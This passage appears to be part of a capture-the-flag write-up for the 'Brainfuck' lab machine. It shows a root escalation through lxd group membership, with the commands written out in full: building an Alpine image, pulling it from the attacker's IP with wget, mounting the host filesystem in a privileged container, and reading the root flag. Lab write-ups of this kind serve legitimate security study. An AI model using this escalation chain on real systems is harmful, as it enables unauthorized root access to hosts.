<p>Elevated privileges are now required to find the root.txt file, my guess</p>
<p>The <strong>lxd</strong> authorization requires the access permission of the local account. The most important condition is that the user must be a member of the <strong>lxd group.</strong></p>
<p>It happens that this account is a member of the lxd group</p>
<p><img src="/img/Brainfuck_Untitled_32.png" alt="Untitled"></p>
<p>To escalate to root privileges, create an image with lxd</p>
<ol>
<li><strong>Steps to be performed on the attacker machine</strong>:</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download build-alpine in your local machine through the git repository.</li>
<li><input disabled="" type="checkbox"> Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</li>
<li><input disabled="" type="checkbox"> Transfer the tar file to the host machine</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git </span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder </span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_33.png" alt="Untitled"></p>
<p>now I need to cp the alpine-v3.13-x86_64-20210218_0139.tar.gz to my &#x2F;root path , because my server execution path is over there.</p>
<p>And need to set server port, go to the opening page again to confirm whether the opening is successful</p>
<ul>
<li>python -m http.server 8000</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_34.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_35.png" alt="Untitled"></p>
<ol>
<li><strong>Steps to be performed on the host machine:</strong></li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download the alpine image</li>
<li><input disabled="" type="checkbox"> Import image for lxd</li>
<li><input disabled="" type="checkbox"> Initialize the image inside a new container.</li>
<li><input disabled="" type="checkbox"> Mount the container inside the &#x2F;root directory</li>
</ul>
<p>Now you need to download the archive you just copied to root</p>
<ul>
<li>wget <a target="_blank" rel="noopener" href="http://10.10.16.11:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz">http://tun0ip:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_36.png" alt="Untitled"></p>
<p>After the image is built it can be added as an image to LXD as follows:</p>
<ul>
<li>lxc image import .&#x2F;alpine-v3.10-x86_64-20191008_1227.tar.gz –alias myimage</li>
</ul>
<p>use the list command to check the list of images</p>
<ul>
<li>lxc image list</li>
</ul>
<p>After executing the command, you can enter the container and cd &#x2F;mnt&#x2F;root to view all resources from the host.</p>
<ul>
<li>lxc init myimage ignite -c security.privileged&#x3D;true</li>
<li>lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</li>
<li>lxc start ignite</li>
<li>lxc exec ignite &#x2F;bin&#x2F;sh</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_37.png" alt="Untitled"></p>
<ul>
<li>cat root.txt ⇒ dcf81acb6c1e7d3545881b9a496daa6e</li>
</ul>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/12/21/c4/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          C4 - C In Four Functions
        
      </div>
    </a>
  
  
    <a href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">AWS EC2 Instance Purchasing Options</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>